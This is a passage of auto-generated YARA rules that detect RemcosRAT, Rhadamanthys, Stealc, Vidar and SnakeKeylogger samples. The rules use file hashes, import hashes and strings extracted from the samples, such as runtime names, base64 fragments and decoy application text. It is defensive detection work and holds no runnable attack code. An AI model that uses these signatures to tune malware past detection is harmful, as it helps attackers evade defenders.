      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '18.50'*/
      $s7 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '18.50'*/
      $s8 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '18.50'*/
      $s9 = "9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX1" ascii /* base64 encoded string */ /* score: '18.00'*/
      $s10 = "AAAAAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s13 = "AABAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__Rhadamanthys_signature__d5834be2544a02797750dc7759c325d4_imp_92 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash3 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash4 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $x1 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x2 = "System.ComponentModel.ComponentConverter, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $x3 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $s4 = "NSystem.ComponentModel.TypeConverter.dll" fullword ascii /* score: '29.00'*/
      $s5 = "HSystem.ComponentModel.Primitives.dll$System.ObjectModel" fullword ascii /* score: '25.00'*/
      $s6 = "Executor GeneratorSupport" fullword ascii /* score: '19.00'*/
      $s7 = "CompilerError.CompilerErrorCollection" fullword ascii /* score: '17.00'*/
      $s8 = "CodeConstructor4CodeDefaultValueExpression8CodeDelegateCreateExpression8CodeDelegateInvokeExpression.CodeDirectionExpression" fullword ascii /* score: '13.00'*/
      $s9 = "SmtpPermission.SmtpPermissionAttribute0NetworkInformationAccess8NetworkInformationPermissionJNetworkInformationPermissionAttribu" ascii /* score: '12.00'*/
      $s10 = "EventLogEntry.EventLogEntryCollection\"EventLogEntryType" fullword ascii /* score: '12.00'*/
      $s11 = "UriSection4UserScopedSettingAttribute\"UserSettingsGroup" fullword ascii /* score: '12.00'*/
      $s12 = "CodeDirective.CodeDirectiveCollection(CodeEntryPointMethod8CodeEventReferenceExpression" fullword ascii /* score: '12.00'*/
      $s13 = "SmtpPermission.SmtpPermissionAttribute0NetworkInformationAccess8NetworkInformationPermissionJNetworkInformationPermissionAttribu" ascii /* score: '12.00'*/
      $s14 = "erformanceCounterManager8PerformanceCounterPermissionDPerformanceCounterPermissionAccessJPerformanceCounterPermissionAttributeBP" ascii /* score: '11.00'*/
      $s15 = "LanguageOptions$TempFileCollection" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043_imphash__Stealc_signature__c7269d59926fa4252270f407e4dab043_imphas_93 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash2 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash3 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
   strings:
      $s1 = "bad defer entry in panicbad defer size class: i=bypassed recovery failedcan't scan our own stackconnection reset by peerdouble t" ascii /* score: '25.00'*/
      $s2 = "morebuf={pc:advertise errorasyncpreemptoffforce gc (idle)key has expiredmalloc deadlockmisaligned maskmissing mcache?ms: gomaxpr" ascii /* score: '19.00'*/
      $s3 = "ime.semacreateruntime.semawakeupruntime: heapGoal=runtime: npages = runtime: range = {streams pipe errorsystem page size (traceb" ascii /* score: '19.00'*/
      $s4 = "ocs=network is downno medium foundno such processpreempt SPWRITErecovery failedruntime error: runtime.gopanicruntime: frame runt" ascii /* score: '18.00'*/
      $s5 = "runtime.(*sweepLocker).blockCompletion" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.newSweepLocker" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.(*sweepLocker).dispose" fullword ascii /* score: '12.00'*/
      $s8 = "runtime.(*sweepLocker).sweepIsDone" fullword ascii /* score: '12.00'*/
      $s9 = "runtime.abiRegArgsType" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.abiRegArgsEface" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.mix32" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.gcenable_setup" fullword ascii /* score: '10.00'*/
      $s13 = "letionStatus failedcasfrom_Gscanstatus: gp->status is not in scan statefunction symbol table not sorted by program counter:mallo" ascii /* score: '8.00'*/
      $s14 = "ime: max = runtime: min = runtimer: bad pscan missed a gstartm: m has pstopm holding p already; errno= mheap.sweepgen= not in ra" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and pe.imphash() == "c7269d59926fa4252270f407e4dab043" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5867427e_RemcosRAT_signature__770b35ba_RemcosRAT_signature__b3e1a441_94 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5867427e.vbs, RemcosRAT(signature)_770b35ba.vbs, RemcosRAT(signature)_b3e1a441.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5867427e2a69435285a061f4cc882429558b4f7a2c0569219e74fdb7d68ec877"
      hash2 = "770b35baa103302f231c6be89e96d55294801a04aee02693842aa745f6dce621"
      hash3 = "b3e1a441845d5db54c8b20222f61259157d96a5c681ca893640d737b546e5420"
   strings:
      $s1 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s2 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s3 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s4 = "SSMON_LogError \"MapNetworkDrive Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '18.00'*/
      $s5 = "Private Sub ProcessEvent" fullword ascii /* score: '18.00'*/
      $s6 = "= in_xmlElement.getAttribute( \"serverPassword\" )" fullword ascii /* score: '17.00'*/
      $s7 = "= in_xmlElement.getAttribute( \"serverPort\" ) + 0" fullword ascii /* score: '16.00'*/
      $s8 = "= in_xmlElement.getAttribute( \"reportPeriodMinutes\" ) + 0" fullword ascii /* score: '16.00'*/
      $s9 = "WScript.Echo in_strMessage" fullword ascii /* score: '13.00'*/
      $s10 = "WScript.Quit( 1 )" fullword ascii /* score: '13.00'*/
      $s11 = "If Not WScript.Arguments.Named.Exists(\"ConfigFile\") Then" fullword ascii /* score: '13.00'*/
      $s12 = "WScript.Echo Now" fullword ascii /* score: '13.00'*/
      $s13 = "WScript.Echo \"No administrator defined. Ignoring \" & in_strEmailSubject" fullword ascii /* score: '13.00'*/
      $s14 = "WScript.Echo \"Verbose mode enabled\"" fullword ascii /* score: '13.00'*/
      $s15 = "= in_xmlElement.getAttribute( \"formatAsHtml\" ) + 0" fullword ascii /* score: '13.00'*/
   condition:
      ( ( uint16(0) == 0x0a0d or uint16(0) == 0x5627 ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__75a4146a_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_95 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_75a4146a.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ae129ff9.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_57910164.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ad188854.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_af1dac32.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f7fe3016.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "75a4146af3520c8bb236cfe21ef507eec5f8a082ab20f4dfad55765b6fc04049"
      hash2 = "ae129ff90d7634798454e7df6ea731577ce9cc456fb6f2497f3af1c77abbb815"
      hash3 = "579101645425dfc71e51c4200cbb69b6ffb0429254a86c913d48f0cebbfcc85a"
      hash4 = "ad188854da20c440975e7bf1bfc218c1917da6d7155c77b8c03fefc148ac1759"
      hash5 = "af1dac32cb850795edce8871424e105668dd55e7cab6d1087a1d484e95f5ce83"
      hash6 = "f7fe3016d93d6ccf5f6bde386675afa006b920e015ad70a8698f8524380635b2"
   strings:
      $s1 = "{0}. {1} - {2} pts ({3} attempts) [{4}] - {5}" fullword wide /* score: '19.00'*/
      $s2 = "GetTargetNumber" fullword ascii /* score: '14.00'*/
      $s3 = "targetNumber" fullword ascii /* score: '14.00'*/
      $s4 = "lblAttempts" fullword wide /* score: '11.00'*/
      $s5 = "<Attempts>k__BackingField" fullword ascii /* score: '11.00'*/
      $s6 = "Attempts: {0}" fullword wide /* score: '11.00'*/
      $s7 = "Congratulations! You guessed it in {0} attempts!" fullword wide /* score: '11.00'*/
      $s8 = "Attempts:" fullword wide /* score: '11.00'*/
      $s9 = "<GetHighScores>b__4_2" fullword ascii /* score: '9.00'*/
      $s10 = "GetHighScores" fullword ascii /* score: '9.00'*/
      $s11 = "<GetHighScores>b__1" fullword ascii /* score: '9.00'*/
      $s12 = "gameLogic" fullword ascii /* score: '9.00'*/
      $s13 = "<GetHighScores>b__4_0" fullword ascii /* score: '9.00'*/
      $s14 = "GameLogic" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__96 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "internal/syscall/windows.procGetProcessMemoryInfo" fullword ascii /* score: '16.00'*/
      $s2 = "internal/poll/fd_mutex.go" fullword ascii /* score: '15.00'*/
      $s3 = "os.ErrProcessDone" fullword ascii /* score: '15.00'*/
      $s4 = "internal/syscall/windows.procNetUserGetLocalGroups" fullword ascii /* score: '14.00'*/
      $s5 = "io.ErrClosedPipe" fullword ascii /* score: '13.00'*/
      $s6 = "kroot jobsmakechan: bad alignmentmissing type in runfinqnanotime returning zerono space left on deviceoperation not permittedope" ascii /* score: '12.00'*/
      $s7 = "os/executable.go" fullword ascii /* score: '12.00'*/
      $s8 = "os/exec.go" fullword ascii /* score: '12.00'*/
      $s9 = "os/exec_windows.go" fullword ascii /* score: '12.00'*/
      $s10 = "os/executable_windows.go" fullword ascii /* score: '12.00'*/
      $s11 = "os/tempfile.go" fullword ascii /* score: '11.00'*/
      $s12 = "runtime.fingCreate" fullword ascii /* score: '10.00'*/
      $s13 = "io/pipe.go" fullword ascii /* score: '10.00'*/
      $s14 = "time.atoiError" fullword ascii /* score: '10.00'*/
      $s15 = "value=connectconsolecpuproffloat32float64forcegcgctracehead = invalidpanic: runningsyscalluintptrunknownwaiting bytes,  etypes  " ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__SnakeKeylogger_signature__995cce3d6fb20b2d8af502c8788f55d7_i_97 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
   strings:
      $s1 = "        publickeublickeykeytokenretargetrgetablecontentttenttypewindowsrsruntime" fullword wide /* score: '28.00'*/
      $s2 = "2System.ComponentModel.dll@System.ComponentModel.Primitives" fullword ascii /* score: '25.00'*/
      $s3 = "xSystem.Collections.Generic.IEnumerator<TElement>.get_Current" fullword ascii /* score: '15.00'*/
      $s4 = "4ParseProcessorArchitecture@" fullword ascii /* score: '15.00'*/
      $s5 = "@<ExecuteCallbackHandlers>b__38_0" fullword ascii /* score: '14.00'*/
      $s6 = "&TryGetFieldAccessor(get_FieldRuntimeTypeBget_ExplicitLayoutFieldOffsetData&get_FieldTypeHandle@" fullword ascii /* score: '12.00'*/
      $s7 = "<UnregisterCancellationCallback:get_InvokeMayRunArbitraryCode@" fullword ascii /* score: '12.00'*/
      $s8 = "ParseErrorl<ParseNamedTypeName>g__ApplyLeadingDotCompatQuirk|20_0" fullword ascii /* score: '10.00'*/
      $s9 = "Version string portion was too short or too long" fullword wide /* score: '10.00'*/
      $s10 = "InternalSample,GetSampleForLargeRange*get_HasDaylightSaving@" fullword ascii /* score: '9.00'*/
      $s11 = "*GetArrayDataReference]" fullword ascii /* score: '9.00'*/
      $s12 = "\"get_ReflectedType,get_IsGenericParameter8get_IsGenericMethodParameter\"get_IsGenericType6get_IsGenericTypeDefinition" fullword ascii /* score: '9.00'*/
      $s13 = "GetTypeCodeImpl IsInstanceOfType" fullword ascii /* score: '9.00'*/
      $s14 = " CompleteTimedOut" fullword ascii /* score: '9.00'*/
      $s15 = "$get_MoveNextAction@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5a23efc3_RemcosRAT_signature__7f46e341_98 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5a23efc3.js, RemcosRAT(signature)_7f46e341.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5a23efc306dd589c16d9781de2b9d26eeeddccfca23310247912edc3323fa979"
      hash2 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
   strings:
      $s1 = "UG9zdFF1aXRNZXNzYWdlAAAAUG9zdE1lc3NhZ2VBAAAAAFBlZWtNZXNzYWdlVwAAAABQZWVrTWVzc2FnZUEAAAAAT2Zmc2V0UmVjdAAAAABPZW1Ub0NoYXJBAAAAAE1l" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s2 = "FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '18.50'*/
      $s3 = "EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '18.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA5" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s5 = "AEAAAEAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s7 = "ADAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s8 = "AAAAAEAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s9 = "bAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s10 = "CAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '12.50'*/
      $s11 = "AAAAAAEAAAAAAACAAAAA" ascii /* base64 encoded string  */ /* score: '12.50'*/
      $s12 = "0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q" ascii /* score: '11.00'*/
      $s13 = "AAAA/gAAAP4AAAH+AAAB/wAAA/8AAAP/gAAH/4AAB//AAA3/wAAd/8AAGf7AAAG2wAABtsAAAbYAAAGwAAABgAAAAYAAAAGAAAABgAAAAAAAAAAAAAD/////////////" ascii /* score: '11.00'*/
      $s14 = "//////////////////////////////8B///+AP///gD///4A///+AP///AD///wAf//4AH//+AA///AAP//wAB//4AAf/8AAH//AAB//xAAf//wAH//8AT///An///wP" ascii /* score: '11.00'*/
      $s15 = "AdAB5ACAAcAB" ascii /* base64 encoded string */ /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__a8741f2d_RemcosRAT_signature__aa569300_99 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_a8741f2d.js, RemcosRAT(signature)_aa569300.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a8741f2d62f81c47812fd549d14aea8d5872afb9b9788d69c6f14d5bf6fc74ac"
      hash2 = "aa56930042a94ecc6a42c1c4bbeadaf03229d2ec81784476c790977be5fc0100"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '18.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s4 = "AAAAAAAAAAAAAABAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s5 = "AABAAAAAAAAAAAAAADAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s8 = "ADAAAAAAAAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s9 = "4AAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s10 = "fEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s11 = "AAAAAHeAD3BwcHBwd4APcAAAAAB3gA93BwcHB3eAD////////4AAAAAAAAAAAMzMzMzMzMzMKAAAABAAAAAPAAAAAQAEAAAAAAB4AAAAAAAAAAAAAAAQAAAAEAAAAAAA" ascii /* score: '12.00'*/
      $s12 = "/4N+DAB1CYvWi8OLCP9R8F5bw41AAIsQ/1Jcw4vAi0B4iwj/UQjDjUAA9kBSEA+VwMNTVovai/CLxujr////Oth0G4TbdAmBTlAAABAA6weBZlD//+//i8aLEP9SXF5b" ascii /* score: '11.00'*/
      $s13 = "b19fb29fb19" ascii /* base64 encoded string*/ /* score: '11.00'*/
      $s14 = "hMB0BTPAXlvDsAFeW8NTVovYi3NshfZ0EIvGixD/UjiEwHQFM8BeW8OwAV5bw1NWi9iLc2yF9nQQi8aLEP9SMITAdAUzwF5bw7ABXlvDU1aL2ItzbIX2dBCLxosQ/1JE" ascii /* score: '11.00'*/
      $s15 = "32wkCN8sJNjC3sGDxBDrAt8o3wQk2cFO2fjfHCTc+YoEJAQwPDpyAgQHiAbZwdjTm9/gnnPh2WwkAoPEBN3D3cLdwd3AWSnxKcp2ECnWsDAB0esDiAQySnX6iAbDkFWL" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fb51ffcf_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_100 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fb51ffcf.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_10f246e9.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_82fb3f98.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_944c9457.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f67354f2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fb51ffcffd134849ebc6114eacc45a0bd9f2430188fd33064217df5b4cd41508"
      hash2 = "10f246e9a23f84a9e80787e654d3f5612eaded3b992ccaa7a92a94ce8676e40f"
      hash3 = "82fb3f98f9a5a3c050c3027605199400a80c204611173131096006bb8ff7204d"
      hash4 = "944c94577ed913dad804faa6e0a51c10ec26780e63b8852c92c64f23919a4848"
      hash5 = "f67354f208b9b7ea9e45262b27221c5862c73503d92139051a88c0479fc04cda"
   strings:
      $s1 = " Windows Forms Password Generator" fullword ascii /* score: '12.00'*/
      $s2 = "passwordGenerator" fullword ascii /* score: '12.00'*/
      $s3 = "PasswordStrength" fullword ascii /* score: '12.00'*/
      $s4 = "<IsPasswordValid>b__12_3" fullword ascii /* score: '12.00'*/
      $s5 = "<IsPasswordValid>b__12_0" fullword ascii /* score: '12.00'*/
      $s6 = "<IsPasswordValid>b__12_1" fullword ascii /* score: '12.00'*/
      $s7 = "<IsPasswordValid>b__12_2" fullword ascii /* score: '12.00'*/
      $s8 = "GenerateSecurePassword" fullword ascii /* score: '12.00'*/
      $s9 = "Windows Forms Password Generator" fullword wide /* score: '12.00'*/
      $s10 = "PassGenerator.Forms" fullword ascii /* score: '10.00'*/
      $s11 = "PassGenerator.Properties" fullword ascii /* score: '10.00'*/
      $s12 = "PassGenerator.Properties.Resources" fullword wide /* score: '10.00'*/
      $s13 = "get_ExcludeSimilar" fullword ascii /* score: '9.00'*/
      $s14 = "get_ExcludeAmbiguous" fullword ascii /* score: '9.00'*/
      $s15 = "get_UseCustomCharacters" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_101 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash5 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash6 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash7 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "System.Collections.Generic.IEnumerable<System.Reflection.Runtime.MethodInfos.RuntimeConstructorInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s2 = "System.Collections.Generic.IEnumerator<System.Reflection.FieldInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<System.Reflection.FieldInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s4 = "Zget_RuntimeMethodCommonOfUninstantiatedMethod@" fullword ascii /* score: '15.00'*/
      $s5 = "System.Collections.Generic.IEnumerator<System.Reflection.Runtime.MethodInfos.RuntimeConstructorInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s6 = "System.Collections.Generic.IEnumerable<System.Reflection.ConstructorInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s7 = "XGetRuntimeGenericParameterTypeInfoForMethods" fullword ascii /* score: '12.00'*/
      $s8 = "get_Reader@" fullword ascii /* score: '12.00'*/
      $s9 = "IsSystemArrayZHasExplicitOrImplicitPublicDefaultConstructorTNormalizedPrimitiveTypeSizeForIntegerTypes" fullword ascii /* score: '10.00'*/
      $s10 = "BCreateChangeTypeArgumentException" fullword ascii /* score: '9.00'*/
      $s11 = "8get_QualifiedMethodSignature@" fullword ascii /* score: '9.00'*/
      $s12 = "get_MemberType@" fullword ascii /* score: '9.00'*/
      $s13 = "0ConvertPointerIfPossible2CreateChangeTypeException" fullword ascii /* score: '9.00'*/
      $s14 = "jget_TypeRefDefOrSpecsForDirectlyImplementedInterfaces@" fullword ascii /* score: '9.00'*/
      $s15 = "get_Suffix@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__102 {
   meta:
